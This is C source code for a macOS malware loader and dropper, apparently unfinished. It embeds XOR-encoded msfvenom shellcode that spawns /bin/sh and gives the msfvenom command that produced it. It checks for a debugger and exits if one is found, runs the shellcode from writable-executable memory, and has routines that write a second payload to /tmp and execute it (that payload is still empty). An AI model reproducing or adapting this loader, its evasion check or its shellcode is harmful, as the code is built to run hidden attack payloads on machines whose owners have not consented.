#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <fcntl.h>


//start of the dropper functions
void save_payload_to_file(const unsigned char *payload, size_t payload_size, const char *output_path){
    FILE *fp = fopen(output_path, "wb");
    if (fp == NULL){
        perror("failed to open for writing");
        exit(EXIT_FAILURE);
    }
    fwrite(payload, 1, payload_size, fp);
    fclose(fp);
}


void execute_dropped_file(const char *file_path){
    if(system(file_path) != 0){
        perror("failed to execute dropped file");
    }
}//end of dropper functions 

//msfvenom -p osx/x64/exec CMD=/bin/sh -e x64/xor -b '\x00\x0a\x0d' -i 10 -f c
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xcf\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xe8\x64\xd0\x14\xfa\xfc\x74\x05\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xa0\x55\x19"
"\x5c\x7b\x15\xa0\xfa\x17\x9b\x98\x99\xff\x13\x8b\xfa\x17"
"\x2c\x6b\xbb\xdd\x5e\x84\x76\x2a\xed\x50\x5c\xcb\xa4\x53"
"\x4d\xc5\x9c\x2f\xeb\x05\x1e\x80\xe2\xfe\x0f\x68\xe6\xd1"
"\xac\x0b\x55\x30\x8e\xad\x62\xd7\x8a\x0b\x55\x87\x7d\xf1"
"\x9c\x59\xe8\x5e\xfe\x2c\xef\x68\x56\x60\x52\xbc\x87\x37"
"\x39\xdf\x98\xda\x81\x6d\x60\x67\x13\x0b\xda\x05\xa3\xda"
"\xae\xe6\xd6\x8f\xdc\x24\xa3\xda\x19\x15\x78\x47\x58\x70"
"\x48\xb9\xf3\xad\x13\xbb\x6b\xfc\x14\x08\xa9\x51\xa4\x75"
"\xd1\x2f\x37\xd9\xf3\x4d\xce\xff\x72\x27\x80\x17\x72\x88"
"\x4a\xf9\x6e\x27\x80\xa0\x81\x24\x61\xcb\x07\xa1\x57\x87"
"\x26\x4d\x7e\x4e\xb6\x90\x52\x10\xc5\xfa\xb0\xf4\x65\xb1"
"\x60\xfc\xe4\xfd\x8e\x91\x72\x06\xae\x7d\x21\x79\x88\x86"
"\x72\x06\x19\x8e\xea\xd4\xa1\x9f\x9d\x22\x74\x8b\xe4\x4d"
"\x3f\x5e\xc5\xd4\xa9\xca\x53\x83\x85\x8d\x83\x60\x5e\x9b"
"\x3d\x4e\xaf\x38\x34\xae\xdf\x5e\xb9\x48\xbd\x38\x34\x19"
"\x2c\x07\xc2\x3d\xfc\xc9\xb5\x4b\x15\x9b\x8d\xff\x65\x8f"
"\xe6\xa9\x68\x2c\x43\x45\xb6\x5b\x84\x02\x61\x5c\x2b\x4f"
"\x3f\xec\x4a\x83\xa4\xd8\x2d\x42\x3f\xec\xfd\x70\xef\xcb"
"\xaf\x45\x54\x33\xa2\x85\x61\xec\x9a\x9a\x88\x3e\x4d\x34"
"\xd6\x22\x20\x49\x4e\x34\x11\x7b\x3c\x14\x22\x0c\xf9\xfa"
"\x90\xbe\xb8\x12\x2a\x0c\xf9\x4d\x63\x8a\xd0\x0c\x21\xe6"
"\xb3\xc2\xb3\x7b\x8c\xa5\xf2\xbb\x2b\xfd\x27\xcc\x42\x1f"
"\x21\x02\x5a\x3d\x64\xa7\xe1\xc6\x41\xb5\x94\xbc\xa1\x23"
"\xe7\xc5\x41\xb5\x23\x4f\xb6\xda\x25\x63\x33\xe9\xb4\x6e"
"\x64\x17\x50\x1d\xf6\x67\x93\x0b\xd3\xd9\xea\xce\x6c\x87"
"\x94\x45\xa9\x85\xd7\xa0\x0b\xd4\x2f\xc3\x8e\xf6\xbf\xa0"
"\x7b\xe4\x11\xe5\x28\x63\x9f\x67\xe4\x8d\x46\xad\xa3\x8a"
"\xd2\xa0\xbe\xf3\xc0\xc7\x8d\xd8\x5c\xf4\x05";

unsigned int shellcode_len = sizeof(buf);


int isDebuggerPresent(){
    int mib[4];
    struct kinfo_proc info;
    size_t size = sizeof(info);

    //set the process ID and the number of sysctl mib elements
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();

    //call sysctl to get process info
    if(sysctl(mib, 4, &info, &size, NULL, 0) == -1){
        perror("sysctl");
        return -1;
    }

    if (info.kp_proc.p_flag & P_TRACED){
        return 1;//debugger is present
    }
    return 0;//debugger is not present
}


int main()

{
    unsigned char new_payload[] = {/*idk what to put here yet*/};

    size_t new_payload_size = sizeof(new_payload);
    const char *output_path = "/tmp/dropped_binary";

    if(isDebuggerPresent()){
    //this somehow always evaluates to true need to look into that
    //seems that it was perceived as a pointer added () and it worked
        printf("debugger detected. exiting!\n");
        exit(1);
    }

    void* exec_mem = mmap(NULL, shellcode_len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
    }


    memcpy(exec_mem, buf, sizeof(buf));


    void (*payload)() = (void (*)())exec_mem;
    payload();


    munmap(exec_mem, sizeof(buf));



    //save the new payload to the file
    save_payload_to_file(new_payload, new_payload_size, output_path);

    //execute the dropped file
    execute_dropped_file(output_path);


    return 0;
}